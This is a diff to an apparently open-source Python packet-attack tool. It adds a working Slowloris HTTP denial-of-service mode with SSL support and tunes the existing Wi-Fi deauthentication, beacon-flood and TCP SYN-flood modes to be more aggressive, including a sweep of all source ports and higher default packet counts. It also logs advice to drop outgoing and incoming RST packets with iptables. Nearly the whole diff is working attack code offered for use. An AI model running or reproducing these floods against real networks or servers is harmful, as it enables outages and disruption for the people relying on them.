@@ -22,6 +22,7 @@ You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
 """
 import socket
+import ssl
 import struct
 import sys
 import time
@@ -79,7 +80,7 @@ def wifi_deauth_cb(pargs):
 			try:
 				rtap = psock_rcv.recvp(lowest_layer=radiotap.Radiotap)[0]
 			except (IndexError, socket.timeout, OSError):
-				logger.debug("no packets..")
+				logger.debug("no packets received..")
 				continue
 
 			try:
@@ -133,13 +134,17 @@ def wifi_deauth_cb(pargs):
 			pargs.current_channel = channel
 
 			try:
-				time.sleep(0.4 if cnt == 0 else 0.005)
+				time.sleep(0.4 if cnt == 0 else 0.05)
 			except KeyboardInterrupt:
 				pargs.is_running = False
 				break
 
-			logger.info("deauth on channel %3d (%3d APs, round %4d)",
-						channel, len(wdata[channel]), cnt)
+			logger.info("deauth on channel %3d (%3d APs, %3d clients, round %4d)",
+						channel,
+						len(wdata[channel]),
+						sum(len(clients) for ap, clients in wdata[channel].items()),
+						cnt
+			)
 
 			ap_clients = copy.copy(wdata[channel])
 
@@ -202,7 +207,7 @@ def wifi_ap_cb(pargs):
 	_beacon.params[2].body_bytes = pack_B(channels[0])
 	_beacon.seq = 0
 	# adaptive sleeptime due to full buffer on fast sending
-	sleeptime = 0.000001
+	sleeptime = 0.0000001
 	rand_mac = True
 	rand_essid = True
 	pargs.is_running = True
@@ -233,7 +238,7 @@ def wifi_ap_cb(pargs):
 			#logger.info("AP on channel %d: %s", channel, _beacon.params[0].body_bytes)
 
 			try:
-				for cnt_ap in range(10):
+				for cnt_ap in range(3):
 					# send multiple beacons for every ap
 					psock_send.send(beacon.bin())
 					time.sleep(sleeptime)
@@ -350,7 +355,7 @@ def tcp_cb(pargs):
 	iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP
 	iptables -I INPUT -p tcp --tcp-flags ALL RST -j DROP
 	"""
-	logger.info("For best performance set set these rules: %r", iptables_rules_info)
+	logger.info("For best performance set set these rules: %s", iptables_rules_info)
 	pkt_tcp_syn = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src) +\
 		ip.IP(src_s=pargs.ip_src, dst_s=pargs.ip_dst, p=ip.IP_PROTO_TCP) +\
 		tcp.TCP(sport=12345, dport=pargs.port_dst)
@@ -367,12 +372,14 @@ def tcp_cb(pargs):
 			try:
 				return pkt.ip.tcp.flags == tcp.TH_SYN | tcp.TH_ACK
 			except Exception as ex:
-				logger.warning(ex)
+				#logger.warning(ex)
+				pass
+			return False
 
 		while is_running:
 			try:
 				pkt_rsp = psock_rcv.recvp(filter_match_recv=filter_cb)[0]
-				logger.debug("got answer packet: %r", pkt_rsp)
+				#logger.debug("got SYN,ACK: %r", pkt_rsp)
 			except IndexError:
 				logger.debug("no packets..")
 				continue
@@ -392,13 +399,16 @@ def tcp_cb(pargs):
 	tcp_l = pkt_tcp_syn.ip.tcp
 
 	logger.debug("sending...")
+	input = 0x31CE
 
-	for cnt in range(pargs.count):
+	#for cnt in range(pargs.count):
+	for sport in range(0, 65536):
 		tcp_l.seq = randrange(1000, 123123)
-		tcp_l.sport = randrange(1000, 65536)
-		tcp_l.seq = 1024
-		tcp_l.sport = 1024
+		tcp_l.sport = sport ^ input
 		psock_send.send(pkt_tcp_syn.bin())
+		print("\rsent %d syn" % sport, end="")
+		#time.sleep(0.0001)
+	print()
 
 	logger.debug("finished")
 	is_running = False
@@ -407,6 +417,73 @@ def tcp_cb(pargs):
 	psock_send.close()
 	psock_rcv.close()
 
+
+def slowlory_cb(pargs):
+	running = [True]
+	connected_socks = {}
+	requestline = b"GET " + str.encode(pargs.path) + b" HTTP/1.1\r\nHost: " + str.encode(pargs.ip_dst) + b"\r\n"
+
+	def connect_cycler():
+		conn_cnt = 0
+
+		while running[0]:
+			conn_cnt += 1
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			send_cb = sock.send
+
+			if pargs.ssl:
+				logger.debug("using SSL")
+				sock = ssl.wrap_socket(sock)
+				send_cb = sock.write
+
+			try:
+				sock.connect((pargs.ip_dst, pargs.port_dst))
+				send_cb(requestline)
+				connected_socks[conn_cnt] = [sock, send_cb]
+			except Exception as ex:
+				print()
+				logger.warning("could not connect: %r", ex)
+			# time.sleep(0.1)
+
+	def header_cycler():
+		header_cnt = 0
+
+		while running[0]:
+			header_cnt += 1
+			time.sleep(random.randrange(2, 3))
+			logger.debug("sending headers for %d connections", len(connected_socks))
+
+			for key in list(connected_socks.keys()):
+				try:
+					#logger.debug("\nconn %d: sending header %d", conn_cnt, header_cnt)
+					send_cb = connected_socks[key][1]
+					send_cb(b"X-Forward" + str.encode("%s" % header_cnt) + b": allow\r\n")
+				except Exception as ex:
+					#print(ex)
+					#logger.debug("removing connection %r", key)
+					del connected_socks[key]
+			logger.debug("finished sending headers, %d connections left", len(connected_socks))
+
+	for cnt in range(10):
+		threading.Thread(target=connect_cycler).start()
+		time.sleep(0.1)
+
+	threading.Thread(target=header_cycler).start()
+
+	try:
+		time.sleep(999)
+	except KeyboardInterrupt:
+		pass
+	print()
+	running[0] = False
+
+	logger.debug("closing sockets")
+
+	for key, sock_cb in connected_socks.items():
+		try:
+			sock_cb[0].close()
+		except:
+			pass
 
 PATTERN_IP = re.compile(b"inet (\d+\.\d+\.\d+\.\d+)")
 PATTERN_MAC = re.compile(b"ether (.{2}:.{2}:.{2}:.{2}:.{2}:.{2})")
@@ -456,7 +533,8 @@ if __name__ == "__main__":
 		"arp": (["mac_dst", "ip_dst"], arp_cb),
 		"icmp": (["mac_dst", "ip_dst"], icmp_cb),
 		"ip": (["mac_dst", "ip_dst"], ip_cb),
-		"tcp": (["mac_dst", "ip_dst"], tcp_cb)
+		"tcp": (["mac_dst", "ip_dst"], tcp_cb),
+		"slowlory": (["ip_dst", "port_dst", "ssl"], slowlory_cb)
 	}
 
 	def auto_hex(x):
@@ -470,13 +548,21 @@ if __name__ == "__main__":
 		formatter_class=argparse.RawDescriptionHelpFormatter)
 	parser.add_argument("-m", "--mode", type=str, help="Chose one of: %s" % mode_descr, required=True)
 	parser.add_argument("-i", "--iface_name", type=str, help="Interface to be used", required=True)
-	parser.add_argument("-c", "--count", type=int, help="Amount of packets to be sent", required=False, default=100)
+	parser.add_argument("-c", "--count", type=int, help="Amount of packets to be sent", required=False, default=9999)
 	parser.add_argument("--mac_dst", type=str, help="MAC address of direct target or router", required=False)
 	parser.add_argument("--ip_dst", type=str, help="Target IP address", required=False)
 	parser.add_argument("--port_dst", type=int, help="Target IP address", required=False)
+	parser.add_argument("--ssl", type=bool, help="Use SSL", required=False, default=False)
+	parser.add_argument("--path", type=str, help="Path to use like /index.html", required=False, default="/")
 	parser.add_argument("--channels", type=str, help="Channels to scan", required=False, default=None)
 	parser.add_argument("-n", "--nobroadcast", type=bool, help="Disable broadcast deauth", required=False, default=False)
-	parser.add_argument("--macs_excluded", type=str, help="MAC addresses to exclude for deauth", required=False, default=set())
+	parser.add_argument(
+		"--macs_excluded",
+		type=str,
+		help="MAC addresses to exclude for deauth",
+		required=False,
+		default=set()
+	)
 
 	args = parser.parse_args()
 	args.mac_src, args.ip_src = get_iface_info(args.iface_name)
